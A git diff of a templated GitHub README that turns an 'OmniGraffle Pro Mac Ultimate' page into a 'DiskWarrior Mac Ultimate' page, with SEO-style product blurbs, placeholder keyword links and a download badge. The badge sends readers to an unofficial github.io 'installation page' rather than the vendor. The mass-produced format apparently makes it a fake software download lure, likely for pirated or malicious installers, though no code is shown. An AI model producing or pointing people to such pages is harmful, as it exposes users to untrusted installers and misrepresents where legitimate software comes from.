@@ -1,9 +1,9 @@
-# OmniGraffle Pro Mac Ultimate
+# DiskWarrior Mac Ultimate
 
 <br>
 
 <p align="center">
-  <img src="https://macx.ws/uploads/posts/2022-04/omnigraffle.png" alt="OmniGraffle Pro Logo" width="260">
+  <img src="https://macx.ws/uploads/posts/2018-10/1539174812_diskwarrior.png" alt="DiskWarrior Logo" width="260">
 </p>
 
 <p align="center">
@@ -16,8 +16,8 @@
 <br>
 
 <p align="center">
-  <a href="https://utility-install-mac.github.io/.github/omnigrafflemac">
-    <img src="https://i.postimg.cc/7LTTZgxF/macos-badge-noborder.png" alt="Download OmniGraffle Pro" width="200">
+  <a href="https://utility-install-mac.github.io/.github/diskwarriormac">
+    <img src="https://i.postimg.cc/7LTTZgxF/macos-badge-noborder.png" alt="Download DiskWarrior" width="200">
   </a>
 </p>
 
@@ -27,35 +27,35 @@
 1. Click the button above to open the installation page.
 2. Follow the steps provided there to complete the program installation properly.
 ---
-## What is OmniGraffle Pro?
+## What is DiskWarrior?
 
-[OmniGraffle Pro Mac](#) is a professional diagramming and design tool built for users who need precise, visually clear documents. Instead of relying on generic drawing apps, OmniGraffle focuses on structured layouts, making it ideal for flowcharts, wireframes, organizational charts, and technical diagrams. Smart guides, snapping, and alignment tools help maintain clean geometry, so even complex diagrams remain easy to read. Teams that design workflows or system architectures often adopt **[OmniGraffle Pro](#)** as part of their standard toolkit for planning and documentation.
+[DiskWarrior Mac](#) is a specialized utility designed to repair and rebuild damaged disk directory structures on macOS systems. When drives become slow, behave unpredictably, or refuse to mount, it is often the directory that has become corrupted rather than the physical hardware. DiskWarrior focuses on this layer, analyzing the existing directory, building a replacement, and allowing you to preview changes before committing them. For many users, this approach recovers access to files that seemed permanently lost, making **[DiskWarrior repair](#)** a critical tool in their maintenance kit.
 
-The app includes a rich collection of built-in stencils and templates, which makes starting new projects faster and more consistent. Designers can create reusable libraries for icons, UI elements, and common shapes, then share them across projects for a unified visual language. Support for layers and canvases allows users to separate different levels of detail, such as high-level overviews and low-level technical **[diagram layouts](#)** within the same file. When building complex **[flowchart diagrams](#)** or interface maps, this layered approach keeps everything organized and manageable.
+Unlike simple verification tools, DiskWarrior constructs an entirely new directory based on the best available data and then compares it with the original. This method can resolve issues that other utilities fail to fix, particularly on heavily used volumes or drives that have suffered from power outages and system crashes. By concentrating on **[filesystem directory](#)** integrity, the app helps restore stable performance and reduces the likelihood of further corruption. Users working with external drives, backup disks, and project volumes depend on **[DiskWarrior for Mac](#)** to keep their storage in working order.
 
-OmniGraffle Pro also integrates well with other macOS workflows. Export options include vector formats like SVG and PDF, as well as high-resolution raster outputs suitable for presentations and documentation. Users who need to share their work with non-Mac teams can rely on these formats for accurate reproduction. Advanced users appreciate the ability to script repetitive tasks or generate **[network diagrams](#)** and **[wireframe mockups](#)** from structured data. Combined with detailed styling controls, this makes the app suitable for everything from quick sketches to polished deliverables.
+The software also emphasizes safety. Before making changes, DiskWarrior lets you browse the rebuilt directory as if it were already active, so you can confirm that files and folders appear as expected. This preview function is especially valuable when dealing with mission-critical data such as **[media projects](#)**, archives, or client materials. If the new directory looks correct, DiskWarrior replaces the damaged one; if not, you can choose to leave the disk unchanged while you explore other options. This cautious workflow sets it apart from more aggressive **[disk repair tools](#)**.
 
-For teams working on UX flows, technical documentation, or process modeling, OmniGraffle helps capture ideas in a way that remains clear long after the meeting ends. Its combination of **[vector drawing](#)** precision and diagram-specific tools means you don’t have to compromise between structure and aesthetics. Whether you are mapping infrastructure, planning software, or preparing training material, **[OmniGraffle Mac download](#)** provides a reliable foundation. Over time, building a library of stencils and templates turns the app into a customized environment tailored to your **[diagram design](#)** style and project needs.
+For professionals who manage multiple Macs, servers, or large collections of external drives, DiskWarrior serves as a frontline utility for troubleshooting directory problems. It can help reduce downtime, minimize the need for complete drive clones, and extend the usable life of storage devices. Combined with regular **[backup strategies](#)** and hardware monitoring, **[DiskWarrior download](#)** becomes part of a broader plan to protect data. Even for home users, having a dedicated **[HFS directory](#)** repair tool on hand can mean the difference between a stressful data loss incident and a quick, controlled recovery.
 
 
 ---
-## Features
+## Extended Features
 
-- • Purpose-built tools for flowcharts, wireframes, org charts, and other structured diagrams.
-- • Smart guides, snapping, and alignment options that help keep shapes neat and visually consistent.
-- • Stencil libraries and reusable templates to speed up new projects and maintain a unified visual style.
-- • Support for multiple canvases and layers so complex diagrams can be separated into logical sections.
-- • Export to SVG, PDF, PNG, and other formats suitable for presentations, documentation, and printing.
-- • Powerful styling controls including strokes, fills, shadows, and text options for polished results.
-- • Integration with macOS features such as versioning, full-screen mode, and system fonts.
-- • Scripting and automation support for users who need to generate or update diagrams from data.
-- • Precise vector drawing tools for technical illustrations and interface mockups.
-- • A flexible workspace that accommodates quick brainstorming as well as production-ready artwork.
+- • Repairs and rebuilds damaged disk directories to restore access to files and folders.
+- • Provides a preview of the rebuilt directory so you can verify results before committing changes.
+- • Helps fix disks that fail to mount, appear empty, or show frequent error messages in macOS.
+- • Improves performance on drives slowed down by years of directory fragmentation and minor corruption.
+- • Works with internal and external drives, including many older devices still in active use.
+- • Focuses on filesystem structure rather than surface scanning, complementing hardware diagnostic tools.
+- • Reduces the need for full-disk restores by repairing logical issues instead of wiping the drive.
+- • Useful for media professionals, IT admins, and power users who manage critical storage.
+- • Integrates well into a preventive maintenance routine alongside regular backups.
+- • Offers a straightforward interface that guides users through analysis, preview, and repair steps.
 
 ---
 ## Screenshots
 
-![OmniGraffle Pro Screenshot](https://macx.ws/uploads/posts/2017-09/1506405632_omnigrafflepro_02.png)
+![DiskWarrior Screenshot](https://macx.ws/uploads/posts/2018-10/1539174873_diskwarrior_01.jpg)
 
 ---
 ## System Requirements
